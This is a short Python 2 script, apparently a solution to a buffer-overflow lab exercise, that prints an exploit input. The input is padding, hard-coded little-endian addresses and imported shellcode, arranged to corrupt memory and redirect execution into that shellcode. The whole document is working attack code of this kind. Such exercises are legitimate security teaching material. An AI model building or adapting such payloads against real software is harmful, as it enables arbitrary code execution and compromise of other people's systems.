from struct import pack
from shellcode import shellcode

print 'A' * 40 + pack("<I", 0x080f3750) + pack("<I", 0xbffe8b8c) + " " + shellcode + 'A' * 17 + pack("<I", 0xbffe8b8c) + pack("<I", 0x080f3748) + " A"
